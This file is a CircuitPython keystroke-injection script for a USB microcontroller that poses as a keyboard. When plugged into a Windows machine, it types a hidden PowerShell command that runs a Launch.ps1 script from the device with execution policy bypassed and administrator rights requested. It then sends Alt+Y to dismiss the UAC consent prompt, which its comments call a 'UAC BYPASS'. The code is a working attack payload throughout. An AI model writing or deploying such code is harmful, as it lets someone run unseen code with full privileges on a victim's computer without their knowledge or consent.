import time
import gc
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# 3 Seconds to unplug if something goes wrong
time.sleep(3.0)

# --- MEMORY CLEANUP (CRITICAL) ---
gc.collect()

# --- IMPORT DRIVERS ---
try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    # If drivers missing, blink fast forever
    while True:
        time.sleep(0.1)

# --- SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except:
    time.sleep(1)

# --- LED SETUP ---
led_pin = board.GP23 if hasattr(board, "GP23") else board.GP25
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- PAYLOAD EXECUTION ---
led.value = True

# 1. Open Run Dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()

# 2. Wait for Run Box
time.sleep(1.5)

# 3. Type Command (DIRECT STREAM - NO VARIABLES)
# This prevents the Memory Error by never holding the full string in RAM.

layout.write("powershell -W Hidden -C \"") 
layout.write("$d=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; ")
# We specifically look for ROOT\Launch.ps1
layout.write("Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File',($d+':\\ROOT\\Launch.ps1') -Verb RunAs\"")

# 4. Execute
time.sleep(0.5)
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# --- UAC BYPASS (ALT + Y) ---
time.sleep(5.0) 
kbd.press(Keycode.ALT, Keycode.Y)
time.sleep(0.1)
kbd.release_all()

led.value = False